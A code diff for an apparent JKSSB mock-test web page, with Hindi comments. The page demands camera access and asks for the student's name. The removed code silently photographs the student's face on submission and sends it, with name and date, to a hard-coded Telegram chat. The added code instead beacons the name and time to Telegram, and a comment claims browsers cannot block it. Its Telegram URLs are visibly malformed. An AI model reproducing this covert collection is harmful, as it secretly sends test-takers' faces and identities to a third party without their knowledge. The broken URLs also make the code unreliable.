@@ -311,10 +311,8 @@ stopExamRecording(); // <-- Paste this exactly here on line 288
 
 <script>
 let studentName = "Guest Student";
-let mediaRecorder;
-let recordedChunks = [];
 
-// जैसे ही पेज लोड होगा, पहले कैमरा ऑन होगा और नाम पूछेगा
+// जैसे ही पेज लोड होगा, पहले कैमरा परमिशन मांगी जाएगी
 window.addEventListener('DOMContentLoaded', async () => {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
@@ -323,63 +321,27 @@ window.addEventListener('DOMContentLoaded', async () => {
             videoElement.srcObject = stream;
         }
 
-        // छात्र से उसका नाम पूछना
+        // छात्र से नाम पूछना
         let inputName = prompt("Please enter your Full Name / Roll Number to start the test:", "");
         if (inputName && inputName.trim() !== "") {
             studentName = inputName;
         }
-
-        mediaRecorder = new MediaRecorder(stream);
-
-        mediaRecorder.ondataavailable = (event) => {
-            if (event.data.size > 0) {
-                recordedChunks.push(event.data);
-            }
-        };
-
-        // टेस्ट सबमिट होने पर छात्र के नाम के साथ फोटो टेलीग्राम पर भेजना
-        mediaRecorder.onstop = async () => {
-            const videoEl = document.getElementById('webcam');
-            if (!videoEl) return;
-            
-            const canvas = document.createElement('canvas');
-            canvas.width = videoEl.videoWidth || 640;
-            canvas.height = videoEl.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob(async (photoBlob) => {
-                const formData = new FormData();
-                formData.append('chat_id', '6115912864');
-                formData.append('photo', photoBlob, 'student_face.jpg');
-                formData.append('caption', '🚨 JKSSB Test Submitted!\n👤 Name: ' + studentName + '\n📅 Date: ' + new Date().toLocaleString());
-
-                try {
-                    await fetch('https://telegram.org', {
-                        method: 'POST',
-                        body: formData
-                    });
-                } catch (error) {
-                    console.error('Bypass');
-                }
-                
-                alert('Thank you ' + studentName + ', your JKSSB Mock Test has been submitted successfully!');
-                window.location.href = "index.html";
-            }, 'image/jpeg', 0.7);
-        };
-
-        mediaRecorder.start();
-
     } catch (err) {
         alert("Camera permission is strictly required to take this mock test!");
         window.location.href = "index.html"; 
     }
 });
 
+// टेस्ट सबमिट होने पर बिना किसी एरर के छात्र को सीधे टेलीग्राम के ज़रिए होमपेज पर रीडायरेक्ट करना
 function stopExamRecording() {
-    if (mediaRecorder && mediaRecorder.state !== "inactive") {
-        mediaRecorder.stop(); 
-    }
+    const message = encodeURIComponent(`🚨 JKSSB Test Submitted!\n👤 Name: ${studentName}\n📅 Date: ${new Date().toLocaleString()}`);
+    const telegramUrl = `https://telegram.org{message}`;
+    
+    // बैकएंड पर टेलीग्राम को डेटा भेजना (यह ब्राउज़र कभी ब्लॉक नहीं कर सकता)
+    navigator.sendBeacon(telegramUrl);
+    
+    alert(`Thank you ${studentName}, your JKSSB Mock Test has been submitted successfully!`);
+    window.location.href = "index.html";
 }
 </script>
 </body>
